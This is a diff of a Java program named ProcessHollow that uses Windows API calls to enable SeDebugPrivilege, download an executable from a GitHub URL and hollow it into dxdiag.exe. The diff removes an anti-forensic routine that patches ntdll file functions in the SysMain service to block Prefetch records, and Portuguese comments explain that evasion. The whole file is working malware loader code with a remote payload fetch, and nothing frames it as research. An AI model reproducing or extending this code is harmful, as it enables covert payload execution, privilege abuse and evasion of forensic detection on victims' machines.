@@ -21,24 +21,6 @@ public class ProcessHollow {
     static MethodHandle lookupPrivilegeValue;
     static MethodHandle adjustTokenPrivileges;
     static MethodHandle getCurrentProcess;
-    static MethodHandle getModuleHandle;
-    static MethodHandle getProcAddress;
-    static MethodHandle loadLibrary;
-    static MethodHandle readProcessMemory;
-    static MethodHandle flushInstructionCache;
-    static MethodHandle openSCManager;
-    static MethodHandle openService;
-    static MethodHandle queryServiceStatusEx;
-    static MethodHandle closeServiceHandle;
-    static MethodHandle openProcess;
-    static MethodHandle getLastError;
-    static MethodHandle createToolhelp32Snapshot;
-    static MethodHandle module32First;
-    static MethodHandle module32Next;
-    static MethodHandle getTokenInformation;
-    static MethodHandle getCurrentProcessId;
-
-    static volatile boolean sysApplied = false;
 
     static {
         try {
@@ -114,80 +96,6 @@ public class ProcessHollow {
             closeHandle = linker.downcallHandle(
                 kernel32.find("CloseHandle").orElseThrow(),
                 FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            getModuleHandle = linker.downcallHandle(
-                kernel32.find("GetModuleHandleA").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.ADDRESS));
-
-            getProcAddress = linker.downcallHandle(
-                kernel32.find("GetProcAddress").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
-
-            loadLibrary = linker.downcallHandle(
-                kernel32.find("LoadLibraryA").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.ADDRESS));
-
-            readProcessMemory = linker.downcallHandle(
-                kernel32.find("ReadProcessMemory").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
-                    ValueLayout.JAVA_LONG, ValueLayout.ADDRESS));
-
-            flushInstructionCache = linker.downcallHandle(
-                kernel32.find("FlushInstructionCache").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_LONG));
-
-            openSCManager = linker.downcallHandle(
-                advapi32.find("OpenSCManagerA").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT));
-
-            openService = linker.downcallHandle(
-                advapi32.find("OpenServiceA").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS,
-                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT));
-
-            queryServiceStatusEx = linker.downcallHandle(
-                advapi32.find("QueryServiceStatusEx").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.ADDRESS,
-                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            closeServiceHandle = linker.downcallHandle(
-                advapi32.find("CloseServiceHandle").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            openProcess = linker.downcallHandle(
-                kernel32.find("OpenProcess").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS,
-                    ValueLayout.JAVA_INT, ValueLayout.JAVA_BOOLEAN, ValueLayout.JAVA_INT));
-
-            getLastError = linker.downcallHandle(
-                kernel32.find("GetLastError").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT));
-
-            createToolhelp32Snapshot = linker.downcallHandle(
-                kernel32.find("CreateToolhelp32Snapshot").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT));
-
-            module32First = linker.downcallHandle(
-                kernel32.find("Module32FirstW").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
-
-            module32Next = linker.downcallHandle(
-                kernel32.find("Module32NextW").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
-
-            getTokenInformation = linker.downcallHandle(
-                advapi32.find("GetTokenInformation").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT,
-                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.ADDRESS,
-                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
-
-            getCurrentProcessId = linker.downcallHandle(
-                kernel32.find("GetCurrentProcessId").orElseThrow(),
-                FunctionDescriptor.of(ValueLayout.JAVA_INT));
 
         } catch (Throwable t) {
             throw new RuntimeException(t);
@@ -296,216 +204,42 @@ public class ProcessHollow {
 
             System.out.println("Ready..");
             Thread.sleep(2000);
-        }
-    }
-
-    static void writeRemote(MemorySegment hProc, long addr, byte[] data, Arena arena) throws Throwable {
-        MemorySegment dataSeg = arena.allocate(data.length);
-        dataSeg.copyFrom(MemorySegment.ofArray(data));
-        MemorySegment addrSeg = MemorySegment.ofAddress(addr);
-        MemorySegment oldProt = arena.allocate(ValueLayout.JAVA_INT);
-        int p1 = (int) virtualProtectEx.invokeExact(hProc, addrSeg, (long) data.length, 0x40, oldProt);
-        int w  = (int) writeProcessMemory.invokeExact(hProc, addrSeg, dataSeg, (long) data.length, MemorySegment.NULL);
-        int p2 = (int) virtualProtectEx.invokeExact(hProc, addrSeg, (long) data.length, oldProt.get(ValueLayout.JAVA_INT, 0), oldProt);
-        int f  = (int) flushInstructionCache.invokeExact(hProc, addrSeg, (long) data.length);
-    }
-
-    static byte[] readRemote(MemorySegment hProc, long addr, int size, Arena arena) throws Throwable {
-        MemorySegment buf = arena.allocate(size);
-        MemorySegment rd  = arena.allocate(ValueLayout.JAVA_LONG);
-        int ok = (int) readProcessMemory.invokeExact(hProc, MemorySegment.ofAddress(addr), buf, (long) size, rd);
-        if (ok == 0) return null;
-        byte[] out = new byte[size];
-        for (int i = 0; i < size; i++) out[i] = buf.get(ValueLayout.JAVA_BYTE, i);
-        return out;
-    }
-
-    static long getRemoteFuncAddr(int pid, String dll, String func, Arena arena) throws Throwable {
-        byte[] dllB = (dll + "\0").getBytes();
-        MemorySegment dllSeg = arena.allocate(dllB.length);
-        dllSeg.copyFrom(MemorySegment.ofArray(dllB));
-        MemorySegment hLocal = (MemorySegment) getModuleHandle.invokeExact(dllSeg);
-        if (hLocal.address() == 0) hLocal = (MemorySegment) loadLibrary.invokeExact(dllSeg);
-        if (hLocal.address() == 0) return 0;
-        byte[] funcB = (func + "\0").getBytes();
-        MemorySegment funcSeg = arena.allocate(funcB.length);
-        funcSeg.copyFrom(MemorySegment.ofArray(funcB));
-        MemorySegment localAddr = (MemorySegment) getProcAddress.invokeExact(hLocal, funcSeg);
-        if (localAddr.address() == 0) return 0;
-        long offset = localAddr.address() - hLocal.address();
-        MemorySegment hSnap = (MemorySegment) createToolhelp32Snapshot.invokeExact(0x00000008 | 0x00000010, pid);
-        if (hSnap.address() == 0 || hSnap.address() == -1L) return 0;
-        try {
-            // MODULEENTRY32W = 1080 bytes no x64; dwSize@0, modBaseAddr@24, szModule[256]@48
-            MemorySegment me = arena.allocate(1080, 8);
-            me.set(ValueLayout.JAVA_INT, 0, 1080);
-            int ok = (int) module32First.invokeExact(hSnap, me);
-            while (ok != 0) {
-                StringBuilder sb = new StringBuilder();
-                for (int i = 0; i < 256; i++) {
-                    char c = me.get(ValueLayout.JAVA_CHAR, 48 + (long) i * 2);
-                    if (c == 0) break;
-                    sb.append(c);
-                }
-                if (sb.toString().equalsIgnoreCase(dll)) {
-                    long base = me.get(ValueLayout.JAVA_LONG, 24);
-                    return base + offset;
-                }
-                ok = (int) module32Next.invokeExact(hSnap, me);
-            }
-            return 0;
-        } finally {
-            int ch = (int) closeHandle.invokeExact(hSnap);
-        }
-    }
-
-    static void SysmainPatch() throws Throwable {
-        boolean priv = enableDebugPrivilege();
-        try (Arena arena = Arena.ofConfined()) {
-            MemorySegment hSCM = (MemorySegment) openSCManager.invokeExact(MemorySegment.NULL, MemorySegment.NULL, 0x0004);
-            if (hSCM.address() == 0) {
-                return;
-            }
-            byte[] svcB = "SysMain\0".getBytes();
-            MemorySegment svcSeg = arena.allocate(svcB.length);
-            svcSeg.copyFrom(MemorySegment.ofArray(svcB));
-            MemorySegment hSvc = (MemorySegment) openService.invokeExact(hSCM, svcSeg, 0x0004);
-            if (hSvc.address() == 0) {
-                int c1 = (int) closeServiceHandle.invokeExact(hSCM);
-                return;
-            }
-            MemorySegment ssp = arena.allocate(40, 4);
-            MemorySegment needed = arena.allocate(ValueLayout.JAVA_INT);
-            int qok = (int) queryServiceStatusEx.invokeExact(hSvc, 0, ssp, 40, needed);
-            int pid = ssp.get(ValueLayout.JAVA_INT, 28);
-            int c2 = (int) closeServiceHandle.invokeExact(hSvc);
-            int c3 = (int) closeServiceHandle.invokeExact(hSCM);
-            if (pid == 0) return;
-            MemorySegment hProc = (MemorySegment) openProcess.invokeExact(0x0438, false, pid);
-            if (hProc.address() == 0) {
-                return;
-            }
-            byte[] vacPatch = {(byte) 0x48, (byte) 0xC7, (byte) 0xC0, (byte) 0xA2, (byte) 0x00, (byte) 0x00, (byte) 0xC0, (byte) 0xC3};
-            String[] funcs = {"NtCreateFile", "NtOpenFile", "NtWriteFile"};
-            long[] addrs = new long[funcs.length];
-            byte[][] origs = new byte[funcs.length][];
-            for (int i = 0; i < funcs.length; i++) {
-                addrs[i] = getRemoteFuncAddr(pid, "ntdll.dll", funcs[i], arena);
-                if (addrs[i] == 0) continue;
-                origs[i] = readRemote(hProc, addrs[i], vacPatch.length, arena);
-                if (origs[i] == null) { addrs[i] = 0; continue; }
-            }
-            for (int i = 0; i < funcs.length; i++) {
-                if (addrs[i] == 0 || origs[i] == null) continue;
-                writeRemote(hProc, addrs[i], vacPatch, arena);
-            }
-            sysApplied = true;
-            Thread.sleep(23000);
-            for (int i = 0; i < funcs.length; i++) {
-                if (addrs[i] == 0 || origs[i] == null) continue;
-                writeRemote(hProc, addrs[i], origs[i], arena);
-            }
-            int ch = (int) closeHandle.invokeExact(hProc);
+            System.exit(0);
         }
     }
 
     public static void main(String[] args) throws Throwable {
         try {
-            // 1. PRIMEIRO DE TUDO: SysMain (janela de 23s sem Prefetch) em paralelo
-            Thread patchThread = new Thread(() -> {
-                try {
-                    SysmainPatch();
-                } catch (Throwable t) {
-                }
-            });
-            patchThread.start();
+            enableDebugPrivilege();
 
-            // Espera o patch ativar antes de injetar
-            for (int i = 0; i < 100 && !sysApplied && patchThread.isAlive(); i++) Thread.sleep(100);
-
-            // 2. DEPOIS: inject hollow normal
-            String url  = "https://github.com/vitor6543vitor-arch/dada/raw/refs/heads/main/hh.exe";
+            String url  = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
             String file = "C:\\Windows\\System32\\dxdiag.exe";
 
             byte[] payload = downloadFile(url);
             Load(payload, file);
-
-            // Sai DENTRO da janela: sem .pf proprio (o restore fica p/ o reboot)
-            System.exit(0);
-
-            // 3. Volta automatico: espera a janela fechar (restore) antes de sair
-            patchThread.join();
         } catch (Throwable t) {
         }
     }
 
-    static boolean enableDebugPrivilege() {
+    static void enableDebugPrivilege() {
         try (Arena arena = Arena.ofConfined()) {
             MemorySegment hToken = arena.allocate(ValueLayout.ADDRESS);
             MemorySegment hProc  = (MemorySegment) getCurrentProcess.invokeExact();
-            int otp = (int) openProcessToken.invokeExact(hProc, 0x0028, hToken);
-            if (otp == 0) {
-                return false;
-            }
+            if ((int) openProcessToken.invokeExact(hProc, 0x0028, hToken) == 0) return;
             MemorySegment tok = hToken.get(ValueLayout.ADDRESS, 0);
-            try {
-                // 1. Elevacao do token (TokenElevation=20)
-                MemorySegment elev = arena.allocate(ValueLayout.JAVA_INT);
-                MemorySegment elevLen = arena.allocate(ValueLayout.JAVA_INT);
-                int gel = (int) getTokenInformation.invokeExact(tok, 20, elev, 4, elevLen);
-
-                // 2. LUID do SeDebugPrivilege
-                byte[] nameB = ("SeDebugPrivilege\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
-                MemorySegment nameSeg = arena.allocate(nameB.length);
-                nameSeg.copyFrom(MemorySegment.ofArray(nameB));
-                MemorySegment luid = arena.allocate(8);
-                int lpv = (int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, nameSeg, luid);
-                long luidVal = luid.get(ValueLayout.JAVA_LONG, 0);
-                if (lpv == 0) return false;
-
-                // 3. Lista privilegios do token (TokenPrivileges=3) e procura SeDebug
-                MemorySegment needLen = arena.allocate(ValueLayout.JAVA_INT);
-                int q1 = (int) getTokenInformation.invokeExact(tok, 3, MemorySegment.NULL, 0, needLen);
-                int privSize = needLen.get(ValueLayout.JAVA_INT, 0);
-                boolean found = false;
-                int foundAttrs = 0;
-                if (privSize > 4) {
-                    MemorySegment tpBuf = arena.allocate(privSize, 4);
-                    MemorySegment retLen = arena.allocate(ValueLayout.JAVA_INT);
-                    int q2 = (int) getTokenInformation.invokeExact(tok, 3, tpBuf, privSize, retLen);
-                    if (q2 != 0) {
-                        int count = tpBuf.get(ValueLayout.JAVA_INT, 0);
-                        for (int i = 0; i < count; i++) {
-                            // LUID_AND_ATTRIBUTES: LowPart@+0(INT) HighPart@+4(INT) Attrs@+8(INT)
-                            // (leitura por INT: o buffer tem alinhamento 4, JAVA_LONG quebraria)
-                            long off = 4 + (long) i * 12;
-                            int low = tpBuf.get(ValueLayout.JAVA_INT, off);
-                            int high = tpBuf.get(ValueLayout.JAVA_INT, off + 4);
-                            long eLuid = (((long) high) << 32) | (low & 0xFFFFFFFFL);
-                            int attrs = tpBuf.get(ValueLayout.JAVA_INT, off + 8);
-                            if (eLuid == luidVal) {
-                                found = true;
-                                foundAttrs = attrs;
-                            }
-                        }
-                    }
-                }
-
-                // 4. Tenta habilitar (por INT: LONG no offset 4 = Misaligned)
+            byte[] nameB = ("SeDebugPrivilege\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment nameSeg = arena.allocate(nameB.length);
+            nameSeg.copyFrom(MemorySegment.ofArray(nameB));
+            MemorySegment luid = arena.allocate(8);
+            if ((int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, nameSeg, luid) != 0) {
                 MemorySegment tp = arena.allocate(16);
                 tp.set(ValueLayout.JAVA_INT,  0,  1);
-                tp.set(ValueLayout.JAVA_INT,  4,  (int) (luidVal & 0xFFFFFFFFL));
-                tp.set(ValueLayout.JAVA_INT,  8,  (int) (luidVal >>> 32));
+                tp.set(ValueLayout.JAVA_LONG, 4,  luid.get(ValueLayout.JAVA_LONG, 0));
                 tp.set(ValueLayout.JAVA_INT,  12, 0x00000002);
                 int adj = (int) adjustTokenPrivileges.invokeExact(tok, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
-                int gle2 = (int) getLastError.invokeExact();
-                return gle2 == 0;
-            } finally {
-                int ch = (int) closeHandle.invokeExact(tok);
             }
-        } catch (Throwable t) {
-            return false;
-        }
+            int ch = (int) closeHandle.invokeExact(tok);
+        } catch (Throwable ignored) {}
     }
 
     static byte[] downloadFile(String url) throws Exception {
